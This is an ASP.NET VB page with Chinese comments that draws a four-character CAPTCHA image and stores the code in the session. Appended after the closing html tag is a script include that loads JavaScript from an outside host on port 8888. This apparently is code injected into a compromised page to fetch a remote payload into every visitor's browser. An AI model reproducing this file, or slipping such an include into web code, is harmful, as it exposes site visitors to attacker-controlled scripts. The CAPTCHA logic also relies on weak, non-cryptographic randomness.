<%@ import namespace="System"%>
<%@ import namespace="System.io"%>
<%@ import namespace="System.Drawing"%>
<%@ import namespace="System.Drawing.Imaging"%>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
<title>
</title>
</head>
<body>
</body>
<script language="vb" runat="server">
Sub Page_Load(ByVal Sender As Object, ByVal e As EventArgs)
on error resume next
'RndNum为生成随机码的函数，
        Dim VNum As String = RndNum(4) '该值为生成验证码的位数
        Dim FunctionClass As New FunctionClass
        Session(FunctionClass.GetIP() & "Vnum") = VNum '读取Session
        ValidateCode(VNum)   '根据Session生成图片
End Sub
'--------------------------------------------
'生成图象验证码函数
Sub ValidateCode(ByVal VNum)
Dim Img As System.Drawing.Bitmap
Dim g As Graphics
Dim ms As MemoryStream
Dim gheight As Integer = Int(Len(VNum) * 14)
'gheight为图片宽度，根据字符长度自动更改图片宽度
Img = New Bitmap(gheight, 24)
g = Graphics.FromImage(Img)
g.DrawString(VNum, (New Font("Arial", 12)), (New SolidBrush(Color.Red)), 3, 3) '在矩形内绘制字串（字串，字体，画笔颜色，左上x.左上y）
ms = New MemoryStream()
Img.Save(ms, ImageFormat.Png)
Response.ClearContent() '需要输出图象信息 要修改HTTP头
Response.ContentType = "image/Png"
Response.BinaryWrite(ms.ToArray())
g.Dispose()
Img.Dispose()
Response.End()
End Sub
'--------------------------------------------
'函数名称:RndNum
'函数参数:VcodeNum--设定返回随机字符串的位数
'函数功能:产生数字和字符混合的随机字符串
Function RndNum(ByVal VcodeNum)
Dim Vchar As String = "0，1，2，3，4，5，6，7，8，9，A，B，C，D，E，F，G，H，I，J，K，L，M，N，O，P，Q，R，S，T，U，W，X，Y，Z" '需要使用中文验证，可以修改这里和ValidateCode函数中的字体
Dim VcArray() As String = Split(Vchar, "，") '将字符串生成数组
Dim VNum As String = ""
Dim i As Byte
For i = 1 To VcodeNum
Randomize()
VNum = VNum & VcArray(Int(35 * Rnd())) '数组一般从0开始读取，所以这里为35*Rnd
Next
Return VNum
End Function
</script>
</html>
<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>